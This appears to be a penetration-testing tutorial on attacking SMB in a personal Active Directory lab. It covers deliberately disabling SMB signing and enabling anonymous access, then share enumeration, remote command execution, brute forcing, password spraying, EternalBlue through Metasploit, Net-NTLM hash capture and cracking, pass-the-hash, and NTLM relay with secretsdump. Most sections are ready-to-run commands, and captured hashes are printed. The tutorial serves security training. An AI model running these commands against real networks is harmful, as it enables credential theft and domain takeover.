---
icon: album-collection-circle-user
---

# SMB Common Attacks

#### **Sections**

> 1. SMB Intro
> 2. Making the Lab vulnerable
> 3. SMB Tools & Guest or Anonymous access to Shares
> 4. RCE Via access to Administrative Shares
> 5. SMB Brute Forcing
> 6. SMB Password Spraying
> 7. SMBv1 EternalBlue (CVE-2017-0144)
> 8. Net-NTLM Capture Attack
> 9. Pass the Hash Attack (PTH)
> 10. Net-NTLM Relay Attack
> 11. Other Resources

***

## SMB Intro

The SMB protocol is a network file sharing protocol that allows applications on a computer to read and write to files. SMB also requests services from server programs in a computer network. It's the most critical attack vector if it's not protected well.

The v1 is deprecated and have several vulnerabilities (Eternal Blue, WannaCry, etc).

It can run over multiple ports: 445, 137-139 (NetBIOS), and over UDP.

## Making the Lab vulnerable

### Create a Share

To test it, i've created a share folder called "SharedFiles" with a text file. This directory is shared with 'devan' with read/write rights (Properties->Share->AddUser: 'devan')

<figure><img src="https://dev-angelist.gitbook.io/~gitbook/image?url=https%3A%2F%2F3004761193-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSw7dppa9JTXteSCpJkUd%252Fuploads%252Ffep32LbK18LCheon7brY%252Fimage.png%3Falt%3Dmedia%26token%3D5bf21382-a065-4d32-bca5-a1b5e05e69a1&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=11248981&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Location: `\\CORP-DC\SharedFiles`

Then, we can access to it on Devan's workstation machine using that location

<figure><img src="https://dev-angelist.gitbook.io/~gitbook/image?url=https%3A%2F%2F3004761193-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSw7dppa9JTXteSCpJkUd%252Fuploads%252FJpet7xfpx7cc77YUFzNL%252Fimage.png%3Falt%3Dmedia%26token%3D8f133faa-74c1-4eba-8aad-540d36ed2dc7&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=6e4247fa&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### **Disable SMB Signing**

By default, SMB signing is enabled on Domain Controllers.

**Method 1: Group Policy (Recommended)**

1. Open **Group Policy Editor** (`gpedit.msc`).
2. Navigate to:\
   `Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options`
3. Set the following to **Disabled**:
   * **"Microsoft network server: Digitally sign communications (always)"**
   * **"Microsoft network server: Digitally sign communications (if client agrees)"**
4. Restart the server.

**Method 2: Registry (Manual)**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 0
Restart-Computer -Force
```

***

### **Enable Guest & Anonymous Access**

**Method 1: Group Policy (Recommended)**

1. Open **Group Policy Editor** (`gpedit.msc`).
2. Navigate to:\
   `Computer Configuration → Administrative Templates → Network → Lanman Workstation`
3. Enable **"Enable insecure guest logons"**.
4. Then, go to:\
   `Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options`
5. Set the following to **Enabled**:
   * **"Network access: Let Everyone permissions apply to anonymous users"**
   * **"Accounts: Guest account status"**
6. Restart the server.

**Method 2: Registry (Manual)**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RestrictAnonymous" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "AllowInsecureGuestAuth" -Value 1
Restart-Computer -Force
```

***

### **Allow Anonymous Access to a Specific SMB Share**

**Method 1: Security Policy (`secpol.msc`)**

1. Open **Local Security Policy** (`secpol.msc`).
2. Navigate to:\
   `Security Settings → Local Policies → Security Options`
3. Modify **"Network access: Shares that can be accessed anonymously"** and add **"SharedFiles"**.
4. Restart the server.

**Method 2: Registry (Manual)**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "NullSessionShares" -Value "SharedFiles"
Restart-Computer -Force
```

***

## SMB Tools & Guest or Anonymous access to Shares

{% hint style="info" %}
If the passwords used include special characters, the ideal way to overcome the problem would be to insert them via prompt (as well as for security reasons), in addition you can try to indicate them via "" or '' or by using escaping characters.
{% endhint %}

### SMBMap

We can enumerate SMB shares and access to system using these command:

```bash
smbmap -H corp-dc #List share with anonymous access
smbmap -H corp-dc -u "devan" -p "P@ssword123!" #List Devan's shares
smbmap -H corp-dc -u "devan" --prompt ##List Devan's shares without writing password in cleartext
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

List a specific Share

```bash
smbmap -H corp-dc -u "devan" --prompt -r "SharedFiles"
```

Check OS Version and signing status

```bash
smbmap -H corp-dc -u "devan" --prompt -v            #OS version check
smbmap -H corp-dc -u "devan" --prompt --signing     #Signing check
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

If the signing of message is disabled we can use it for Relay attacks and potentially of exploit eternalblue vuln.

***

### SMB Client

Similar to SMBMap, we can use it to enumerate shares and interact with file system prompt

<pre><code>smbclient -L //corp-dc -N     #Anonymous Login (-N no credentials)
<strong>smbclient //corp-dc -U "dev-angelist.lab/devan%P@ssword123!"     #List Devan's shares
</strong>smbclient //corp-dc/SharedFiles -U devan
smbclient //corp-dc/SharedFiles -U "dev-angelist.lab/devan%P@ssword123!" #we can get file shared using get command
#File system prompt includes command such as: cd, dir, ls, get, put
</code></pre>

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

### Netexec

It's a fantastic tool useful for more common protocols

```bash
nxc smb corp-dc     #Retrieve info about DC, SMB vs, OS vs, domain name and signing status
nxc smb corp-dc -u "" -p "" --users     #Try to authenticate using Null session
nxc smb corp-dc -u "AnAccountThatDoesntExist" --shares  #Try to authenticate using guest account
nxc smb corp-dc -u "devan" -p "P@ssword123!" --shares     #List Devan's shares and info about DC, SMB vs, OS vs, domain name and signing status
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## RCE Via access to Administrative Shares

If it's possible to access administrative shares of SMB, it might be possible to obtain Remote Code Execution (RCE)

```bash
smbmap -H corp-dc -u "administrator" -x "whoami" --prompt
smbmap -H corp-dc -u "administrator" -x "whoami /priv" --prompt
 nxc smb corp-dc -u "administrator" -p 'P@$$W0rd' -x "whoami /priv"
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

In this case we've execute only a whoami command, but for example we can use it for spawn a reverse shell

***

## SMB Brute Forcing

When we're talking about login, we must talk about brute force attack. To perform this we can use tools such as Hydra or [Legba](https://github.com/evilsocket/legba) (suggested for SMB protocol and running with docker)

{% embed url="https://github.com/evilsocket/legba" %}

```bash
docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest  #Get shell within docker
legba smb --smb-workgroup dev-angelist.lab --smb-share "C$" --username administrator --password ./passwords.txt --target corp-dc  #Bruteforce administrator password
legba smb --smb-workgroup dev-angelist.lab --smb-share "SharedFiles" --username devan --password ./passwords.txt --target corp-dc  #Bruteforce Devan's password
```

***

## SMB Password Spraying

A password spraying attack involve a threat actor using a single common password against multiple accounts on the same application, because passwords are common and many times multiple users can use the same password.

We can perform it utilizing Netexec

```bash
nxc smb corp-dc -u "devan" -p passwords.txt  #Basic nxc query - we can use rockyou.txt
nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success  #password spraying on multiple IPs and users
```

***

## SMBv1 EternalBlue (CVE-2017-0144)

Windows system that running SMBv1, can be vulnerable to dangerous attacks, such as `EternalBlue', also known as` CVE-2017-0144' or \`MS-17-010'.

We can enumerate multiple configuration checking the smb version using previous tools (smbap, netexc) or though 'generic tools' such as: nmap and metasploit framework:

#### Nmap

```bash
nmap -p445 --script smb-vuln-ms17-010 corp-dc  #Enumerate vulnerable configuration
```

Metasploit

```bash
#  Scan for vulnerabilty
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS corp-dc
run
#  Exploit vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS corp-dc
run
```

### Other Lab

* [Blue (TryHackMe)](https://tryhackme.com/room/blue) -> [My Writeup](https://dev-angelist.gitbook.io/writeups-and-walkthroughs/thm/eternal-blue)
* [Legacy (HackTheBox)](https://www.hackthebox.com/machines/legacy)

***

## Net-NTLM Capture Attack

When a Windows client authenticates to an SMB server, the NTLM hash of the client is sent to the server for authentication. Depending on the protocol version, it is transmitted differently:

* **Net-NTLMv1**:
  * Uses a simple DES encryption scheme based on the NT hash.
* **Net-NTLMv2**:
  * Uses HMAC-MD5 and a combination of server/client challenges for stronger security.

It is possible to capture a user's Net-NTLM hash by forcing the client to authenticate against a fake SMB server.

Common attack vectors are:

* **Phishing real users**
* **Exploiting a reverse shell**

To set up Responder for capturing Net-NTLM hashes:

1.  **Install Responder**:

    ```bash
    python3 -m venv venv
    source venv/bin/activate
    pip3 install impacket netifaces
    git clone https://github.com/lgandx/Responder.git
    ```
2.  **Start Responder on the victim's network interface (kali)**:

    ```bash
    cd Responder
    sudo python3 Responder.py -I eth1
    ```

<figure><img src="../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

3. **Trigger authentication from the victim machine**:

```bash
C:\> dir \\192.168.57.7\test
#Access is denied.
```

<figure><img src="../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

This will leak the Net-NTLM hash:

```bash
[SMB] NTLMv2-SSP Client   : 192.168.57.9
[SMB] NTLMv2-SSP Username : DEV-ANGELIST\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::DEV-ANGELIST:835fd92467bf9924:402A6AD80187AB11FB4365555DFD8EB3:01010000000000008050C8D5E186DB019D1CCCC0C96282C30000000002000800510051005A00370001001E00570049004E002D0039004D00560044005200430035004F0048003500460004003400570049004E002D0039004D00560044005200430035004F004800350046002E00510051005A0037002E004C004F00430041004C0003001400510051005A0037002E004C004F00430041004C0005001400510051005A0037002E004C004F00430041004C00070008008050C8D5E186DB01060004000200000008003000300000000000000000000000003000002A5FFAB95CA90DF53DDD925A77ABF2D821EC425793DF5EA240819ACB70830A4E0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350037002E0037000000000000000000
```

4.  **Cracking the captured Net-NTLM hash (tools: JohnTheRipper or Hashcat)**:

    ```bash
    # Net-NTLMv1
    john --format=netntlm --wordlist=rockyou.txt hash.txt
    hashcat -m 5500 hash.txt rockyou.txt

    # Net-NTLMv2
    john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
    hashcat -m 5600 hash.txt rockyou.txt
    ```

<figure><img src="../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

***

## Pass the Hash Attack (PTH)

If an attacker obtains an NTLM hash (the hash stored into memory, different than NetNTLM hash), it can be used to authenticate as the user without knowing the password.

We can obtain NTLM using tools such as Mimikatz.

<figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>



**Example NTLM Hash:**

```bash
administrator:f193d757b4d487ab7e5a3743f038f713
```

Using `nxc` (NetExec) to authenticate:

```bash
nxc smb corp-dc -u administrator -H f193d757b4d487ab7e5a3743f038f713
nxc smb corp-dc -u administrator -H f193d757b4d487ab7e5a3743f038f713 --shares
nxc smb corp-dc -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE -X "whoami"
```

If the user of the hash is unknown, we can spray it against a list of users:

```bash
nxc smb corp-dc -u users.txt -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

***

## Net-NTLM Relay Attack

If the captured Net-NTLM hash cannot be cracked, it can be **relayed** to another system **if SMB signing is disabled.**

**The NTLM relay attack has the following steps:**

0\) Check if SMB signing is disabled (pre-requisite)

1\) Interception of Authentication Attempt

2\) Capture of Net-NTLM Challenge-Reponse

3\) Relay to Target SMB

4\) Obtain Unauthorized Access

#### **Check SMB signing status:**

**(on attacker machine)**

```bash
nxc smb corp-dc     #Retrieve info about DC, SMB vs, OS vs, domain name and signing status
smbmap -H corp-dc -u "devan" --prompt --signing  #Signing check
nmap --script smb2-security-mode.nse -p 445 corp-dc  #If the output is "Message signing not required" it's vulnerable
```

**(on target)**:

```powershell
Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature
```

If signing is enabled, it must be disabled via GPO or PowerShell:

```powershell
Set-SmbClientConfiguration -RequireSecuritySignature $false
Set-SmbServerConfiguration -RequireSecuritySignature $false
```

#### **Obtain a list of vulnerable SMB servers**:

```bash
nxc smb corp-dc --gen-relay-list target_list.txt
```

<figure><img src="../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

`192.168.57.9` is the correspective IP of `corp-dc`

#### Start server to replay Net-NTLM Hash

```bash
sudo ntlmrelayx.py --no-http-server -smb2support -t smb://corp-dc -socks
```

**Trigger authentication from the victim machine**:

```bash
dir \\192.168.57.7\test  #Kali Machine (192.168.57.7)
```

Setup Proxychains Proxy

```bash
sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
```

**Using the authenticated session via SOCKS proxy**:

```bash
proxychains lookupsid.py -no-pass -domain-sids domain/user@corp-dc
proxychains secretsdump.py -no-pass domain/user@corp-dc
proxychains smbexec.py -no-pass domain/user@corp-dc
```

***

## Other Resources

* [HexDump - AD](https://www.youtube.com/watch?v=dQz3CMlVYNY\&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn)
* [https://dev-angelist.gitbook.io/crtp-notes](https://dev-angelist.gitbook.io/crtp-notes)
* [https://sensepost.com/blog/2024/guest-vs-null-session-on-windows](https://sensepost.com/blog/2024/guest-vs-null-session-on-windows)
* [https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
* [https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing?tabs=group-policy#disable-smb-signing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing?tabs=group-policy#disable-smb-signing)
